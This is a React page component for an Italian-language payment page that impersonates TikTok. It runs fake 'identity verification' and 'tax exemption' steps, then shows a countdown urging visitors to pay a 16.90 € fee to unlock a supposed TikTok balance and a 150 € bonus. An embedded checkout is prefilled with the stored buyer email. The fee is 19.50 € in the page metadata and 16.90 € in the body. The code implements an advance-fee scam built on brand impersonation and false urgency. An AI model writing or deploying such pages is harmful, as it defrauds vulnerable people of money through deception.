import { createFileRoute } from "@tanstack/react-router";
import { useEffect, useState } from "react";
import tiktokLogo from "@/assets/tiktok-logo-clean.png.asset.json";
import { BACK_REDIRECT_PRODUCT_ID } from "@/lib/checkout-config";
import { CooudCheckout } from "@/components/CooudCheckout";
import { getStoredBuyerEmail } from "@/lib/buyer-email";

export const Route = createFileRoute("/back-redirect")({
  head: () => ({
    meta: [
      { title: "Riduzione delle tasse applicata | Sblocca il tuo saldo TikTok" },
      {
        name: "description",
        content:
          "Abbiamo individuato una riduzione di tasse e commissioni: paga solo 19,50 € e ricevi 150,00 € di bonus allo sblocco del tuo saldo.",
      },
      { property: "og:title", content: "Riduzione delle tasse applicata" },
      {
        property: "og:description",
        content: "Commissioni ridotte a 19,50 € + 150,00 € di bonus. Offerta a tempo limitato.",
      },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
  }),
  component: BackRedirect,
});

const STEPS = [
  "Verifica della tua identità",
  "Ricerca delle esenzioni fiscali",
  "Applicazione della riduzione delle tasse",
  "Calcolo del bonus di compensazione",
];

function BackRedirect() {
  const [step, setStep] = useState(0);
  const [showOffer, setShowOffer] = useState(false);
  const [seconds, setSeconds] = useState(300);
  const [showCheckout, setShowCheckout] = useState(false);
  const [buyerEmail, setBuyerEmail] = useState("");

  const handleCta = () => {
    // Puxa o e-mail do front e abre o checkout da Cooud embutido (sem redirecionar).
    setBuyerEmail(getStoredBuyerEmail());
    setShowCheckout(true);
  };

  useEffect(() => {
    const timers = STEPS.map((_, i) =>
      setTimeout(() => setStep(i), i * 1200),
    );
    const done = setTimeout(() => setShowOffer(true), STEPS.length * 1200 + 600);
    return () => {
      timers.forEach(clearTimeout);
      clearTimeout(done);
    };
  }, []);

  useEffect(() => {
    if (!showOffer) return;
    const id = setInterval(() => setSeconds((s) => (s > 0 ? s - 1 : 0)), 1000);
    return () => clearInterval(id);
  }, [showOffer]);

  const mm = String(Math.floor(seconds / 60)).padStart(2, "0");
  const ss = String(seconds % 60).padStart(2, "0");

  if (!showOffer) {
    return (
      <main className="grid min-h-screen w-full place-items-center bg-white px-6">
        <div className="flex flex-col items-center text-center">
          <img src={tiktokLogo.url} alt="TikTok" className="mb-10 h-16 w-auto animate-bounce" />
          <div className="space-y-4 text-lg font-bold text-neutral-500">
            {STEPS.map((t, i) => (
              <p
                key={t}
                className={`transition-opacity duration-500 ${
                  i <= step ? "opacity-100" : "opacity-0"
                }`}
              >
                {t}
                <span className="animate-pulse">...</span>
              </p>
            ))}
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="flex min-h-screen w-full items-center justify-center bg-white px-6 py-10">
      <section className="flex w-full max-w-md flex-col items-center text-center">
        <img src={tiktokLogo.url} alt="TikTok" className="mb-8 h-24 w-auto" />

        <div className="mb-6 w-full animate-pulse rounded-3xl border-2 border-emerald-500 bg-emerald-50 p-6">
          <p className="mb-2 text-[11px] font-black uppercase tracking-widest text-emerald-600">
            ✅ Offerta unica legata alla tua pratica
          </p>
          <h1 className="text-2xl font-black leading-tight text-neutral-900">
            ABBIAMO INDIVIDUATO UNA RIDUZIONE DI
            <br />
            <span className="uppercase text-emerald-600">TASSE E COMMISSIONI!</span>
          </h1>
        </div>

        <div className="mb-8 w-full rounded-[2.5rem] border border-neutral-100 bg-white p-8 shadow-2xl">
          <p className="mb-4 text-[10px] font-bold uppercase tracking-widest text-neutral-400">
            Questa offerta scade tra:
          </p>
          <div className="mb-6 text-6xl font-black text-rose-500 tabular-nums">
            {mm}:{ss}
          </div>

          <div className="mb-6 space-y-3">
            <p className="text-lg font-bold text-neutral-700">Commissioni ridotte a soli:</p>
            <div className="text-4xl font-black italic text-neutral-900">16,90 €</div>
            <div className="mx-auto my-4 h-[2px] w-12 bg-neutral-200" />
            <p className="bg-gradient-to-r from-rose-500 to-sky-500 bg-clip-text text-2xl font-black uppercase italic tracking-tighter text-transparent">
              + 150,00 € di bonus
            </p>
          </div>

          <p className="border-t border-neutral-100 pt-4 text-[11px] italic leading-tight text-neutral-400">
            *La riduzione di tasse e commissioni è stata applicata. Dopo il pagamento dei 16,90 €, il sistema
            sblocca immediatamente il tuo saldo accumulato e il bonus di 150,00 €.
          </p>
        </div>

        {!showCheckout && (
          <button
            type="button"
            onClick={handleCta}
            className="w-full rounded-full bg-gradient-to-r from-rose-500 to-rose-600 py-6 text-xl font-black uppercase tracking-tighter text-white shadow-lg transition-all hover:from-rose-600 hover:to-rose-700 active:scale-[0.99]"
          >
            Approfitta della mia riduzione + bonus
          </button>
        )}

        {/* Checkout Cooud embutido — e-mail puxado do front, pagamento em euro */}
        {showCheckout && (
          <CooudCheckout
            productId={BACK_REDIRECT_PRODUCT_ID}
            initialEmail={buyerEmail || undefined}
            autoStart={Boolean(buyerEmail)}
            showSummary={false}
            returnPath="/up1"
            className="w-full !p-0 !shadow-none"
          />
        )}
      </section>
    </main>
  );
}
